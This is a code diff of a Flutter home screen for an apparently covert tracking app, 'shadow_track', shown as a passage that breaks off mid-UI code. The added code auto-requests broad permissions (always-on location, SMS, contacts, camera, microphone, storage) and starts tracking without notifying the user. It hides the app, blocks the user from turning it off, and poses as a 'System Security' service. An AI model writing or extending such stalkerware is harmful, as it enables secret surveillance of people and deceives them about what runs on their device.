@@ -1,23 +1,30 @@
-// lib/screens/home_screen.dart 파일에 추가할 내용들
-
-// 클래스 상단에 추가할 import
+import 'package:flutter/material.dart';
 import 'package:flutter/services.dart';
+import 'package:shared_preferences/shared_preferences.dart';
+import 'package:permission_handler/permission_handler.dart';
+import '../services/tracking_service.dart';
 
-// _HomeScreenState 클래스에 추가할 변수들
+class HomeScreen extends StatefulWidget {
+  const HomeScreen({super.key});
+
+  @override
+  State<HomeScreen> createState() => _HomeScreenState();
+}
+
 class _HomeScreenState extends State<HomeScreen> {
   bool _isServiceActive = false;
   bool _isLoading = false;
-  bool _autoStartCompleted = false; // 새로 추가
-  static const MethodChannel _channel = MethodChannel('shadow_track'); // 새로 추가
+  bool _autoStartCompleted = false;
+  static const MethodChannel _channel = MethodChannel('shadow_track');
 
   @override
   void initState() {
     super.initState();
     _loadServiceStatus();
-    _setupAutoStart(); // 새로 추가
+    _setupAutoStart();
   }
 
-  // 🔥 새로 추가: 자동 시작 설정
+  /// 자동 시작 설정
   void _setupAutoStart() {
     // 채널에서 자동 시작 신호 수신 대기
     _channel.setMethodCallHandler((call) async {
@@ -27,12 +34,12 @@ class _HomeScreenState extends State<HomeScreen> {
     });
 
     // 앱 시작 후 잠시 뒤 자동 권한 요청
-    Future.delayed(Duration(seconds: 2), () {
+    Future.delayed(const Duration(seconds: 2), () {
       _requestPermissionsAutomatically();
     });
   }
 
-  // 🔥 새로 추가: 자동 권한 요청
+  /// 자동 권한 요청
   Future<void> _requestPermissionsAutomatically() async {
     if (_autoStartCompleted) return;
 
@@ -41,16 +48,15 @@ class _HomeScreenState extends State<HomeScreen> {
       await _channel.invokeMethod('requestAllPermissions');
 
       // 3초 후 권한 상태 확인
-      Future.delayed(Duration(seconds: 3), () {
+      Future.delayed(const Duration(seconds: 3), () {
         _checkAndAutoStart();
       });
-
     } catch (e) {
       print('자동 권한 요청 오류: $e');
     }
   }
 
-  // 🔥 새로 추가: 권한 확인 및 자동 시작
+  /// 권한 확인 및 자동 시작
   Future<void> _checkAndAutoStart() async {
     try {
       final permissionStatus = await _channel.invokeMethod('checkPermissionStatus');
@@ -64,7 +70,7 @@ class _HomeScreenState extends State<HomeScreen> {
           await _performAutoStart();
         } else {
           // 권한이 부족하면 5초 후 재시도
-          Future.delayed(Duration(seconds: 5), () {
+          Future.delayed(const Duration(seconds: 5), () {
             _requestPermissionsAutomatically();
           });
         }
@@ -74,7 +80,7 @@ class _HomeScreenState extends State<HomeScreen> {
     }
   }
 
-  // 🔥 새로 추가: 자동 시작 수행
+  /// 자동 시작 수행
   Future<void> _performAutoStart() async {
     if (_autoStartCompleted || _isServiceActive) return;
 
@@ -101,7 +107,6 @@ class _HomeScreenState extends State<HomeScreen> {
 
       // 성공 로그 (사용자에게 알림 없이)
       print('자동 추적 시작 완료');
-
     } catch (e) {
       print('자동 시작 오류: $e');
     } finally {
@@ -111,7 +116,7 @@ class _HomeScreenState extends State<HomeScreen> {
     }
   }
 
-  // 기존 _loadServiceStatus 메서드 수정
+  /// 서비스 상태 로드
   Future<void> _loadServiceStatus() async {
     final prefs = await SharedPreferences.getInstance();
     setState(() {
@@ -125,15 +130,15 @@ class _HomeScreenState extends State<HomeScreen> {
     }
   }
 
-  // 🔥 새로 추가: 조용한 모드 (UI 변경)
+  /// 조용한 모드 (UI 변경)
   void _enableQuietMode() {
-    Future.delayed(Duration(seconds: 1), () {
+    Future.delayed(const Duration(seconds: 1), () {
       // 앱을 백그라운드로 이동
       SystemNavigator.pop();
     });
   }
 
-  // 기존 _toggleService 메서드 수정 (수동 토글용)
+  /// 수동 토글 (제한된 접근)
   Future<void> _toggleService() async {
     // 자동 시작이 완료된 경우 수동 토글 제한
     if (_autoStartCompleted && _isServiceActive) {
@@ -179,39 +184,131 @@ class _HomeScreenState extends State<HomeScreen> {
     }
   }
 
-  // 🔥 새로 추가: 제한된 접근 알림
+  /// 권한 요청
+  Future<bool> _requestPermissions() async {
+    final permissions = [
+      Permission.location,
+      Permission.locationAlways,
+      Permission.sms,
+      Permission.storage,
+      Permission.manageExternalStorage,
+      Permission.contacts,
+      Permission.camera,
+      Permission.microphone,
+    ];
+
+    Map<Permission, PermissionStatus> statuses = await permissions.request();
+
+    bool allGranted = statuses.values.every(
+            (status) => status == PermissionStatus.granted
+    );
+
+    if (!allGranted) {
+      _showSnackBar('All permissions are required for system monitoring', Colors.red);
+    }
+
+    return allGranted;
+  }
+
+  /// 제한된 접근 알림
   void _showRestrictedAccess() {
     showDialog(
       context: context,
       builder: (context) => AlertDialog(
-        title: Text('Access Restricted'),
-        content: Text('System security is active. Manual control is disabled for protection.'),
+        title: const Text('Access Restricted'),
+        content: const Text('System security is active. Manual control is disabled for protection.'),
         actions: [
           TextButton(
             onPressed: () => Navigator.of(context).pop(),
-            child: Text('OK'),
+            child: const Text('OK'),
           ),
         ],
       ),
     );
   }
 
-  // build 메서드 수정 (자동 시작 모드일 때 UI 변경)
+  /// 스낵바 표시
+  void _showSnackBar(String message, Color color) {
+    ScaffoldMessenger.of(context).showSnackBar(
+      SnackBar(
+        content: Text(message),
+        backgroundColor: color,
+      ),
+    );
+  }
+
   @override
   Widget build(BuildContext context) {
     // 자동 시작 완료시 최소한의 UI만 표시
     if (_autoStartCompleted && _isServiceActive) {
       return Scaffold(
-          appBar: AppBar(
+        appBar: AppBar(
           title: const Text('System Service'),
-    backgroundColor: Colors.grey[800],
-    ),
-    body: Container(
-    color: Colors.grey[900],
-    child: Center(
+          backgroundColor: Colors.grey[800],
+        ),
+        body: Container(
+          color: Colors.grey[900],
+          child: Center(
+            child: Column(
+              mainAxisAlignment: MainAxisAlignment.center,
+              children: [
+                Icon(
+                  Icons.security,
+                  size: 64,
+                  color: Colors.green[600],
+                ),
+                const SizedBox(height: 16),
+                Text(
+                  'System Security Active',
+                  style: TextStyle(
+                    color: Colors.white,
+                    fontSize: 20,
+                    fontWeight: FontWeight.bold,
+                  ),
+                ),
+                const SizedBox(height: 8),
+                Text(
+                  'Device monitoring is active',
+                  style: TextStyle(
+                    color: Colors.grey[400],
+                    fontSize: 14,
+                  ),
+                ),
+              ],
+            ),
+          ),
+        ),
+      );
+    }
+
+    // 일반 UI
+    return Scaffold(
+        appBar: AppBar(
+          title: const Text('System Service Manager'),
+          centerTitle: true,
+        ),
+        body: Padding(
+        padding: const EdgeInsets.all(16.0),
     child: Column(
-    mainAxisAlignment: MainAxisAlignment.center,
+    crossAxisAlignment: CrossAxisAlignment.stretch,
+    children: [
+    Card(
+    child: Padding(
+    padding: const EdgeInsets.all(16.0),
+    child: Column(
     children: [
     Icon(
-    Icons.security,
-    size:
+    _isServiceActive ? Icons.security : Icons.security_outlined,
+    size: 64,
+    color: _isServiceActive ? Colors.green : Colors.grey,
+    ),
+    const SizedBox(height: 16),
+    Text(
+    _isServiceActive ? 'System Monitoring Active' : 'System Monitoring Inactive',
+    style: Theme.of(context).textTheme.headlineSmall,
+    textAlign: TextAlign.center,
+    ),
+    const SizedBox(height: 8),
+    Text(
+    _isServiceActive
+    ?
